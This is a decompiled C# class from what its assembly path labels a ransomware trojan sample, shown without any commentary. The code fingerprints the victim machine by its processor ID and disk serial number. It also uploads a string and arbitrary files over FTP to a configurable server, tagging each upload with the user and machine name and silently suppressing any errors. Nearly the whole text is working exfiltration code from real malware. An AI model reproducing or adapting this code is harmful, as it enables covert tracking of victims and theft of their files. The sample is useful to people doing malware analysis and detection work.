// Decompiled with JetBrains decompiler
// Type: coxZRmDhvSAWo.c000013
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace coxZRmDhvSAWo
{
  internal sealed class c000013
  {
    [NonSerialized]
    internal static GetString f00004b;

    public static string RuDYtoNcCxI()
    {
      string empty = string.Empty;
      try
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementClass("win32_processor").GetInstances().GetEnumerator())
        {
          if (enumerator.MoveNext())
            empty = enumerator.Current.Properties["processorID"].Value.ToString();
        }
        ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + "C" + ":\"");
        managementObject.Get();
        return managementObject["VolumeSerialNumber"].ToString();
      }
      catch (Exception ex)
      {
        return string.IsNullOrEmpty(empty) ? "" : empty;
      }
    }

    public static void gmIyowWwkfSR(
      string GdSqezTpHHWqI = "URL",
      string p1 = "USERNAME",
      string CFfTnLBdettRX = "ACCESO",
      string p3 = "")
    {
      try
      {
        string str = "";
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(GdSqezTpHHWqI + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + str + ".txt");
        ftpWebRequest.Method = "STOR";
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(p1, CFfTnLBdettRX);
        byte[] bytes = new ASCIIEncoding().GetBytes(p3);
        ftpWebRequest.ContentLength = (long) bytes.Length;
        using (Stream requestStream = ftpWebRequest.GetRequestStream())
          requestStream.Write(bytes, 0, bytes.Length);
      }
      catch
      {
      }
    }

    public static void ybntlhJHhisLb(string p0 = "URL", string p1 = "USERNAME", string gImcvsvcXxT = "ACCESO", string p3 = "")
    {
      try
      {
        string str = "";
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(p0 + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + str + "_" + Path.GetFileName(p3));
        ftpWebRequest.Method = "STOR";
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(p1, gImcvsvcXxT);
        byte[] buffer = System.IO.File.ReadAllBytes(p3);
        ftpWebRequest.ContentLength = (long) buffer.Length;
        using (Stream requestStream = ftpWebRequest.GetRequestStream())
          requestStream.Write(buffer, 0, buffer.Length);
      }
      catch
      {
      }
    }

    static c000013() => Strings.CreateGetStringDelegate(typeof (c000013));
  }
}
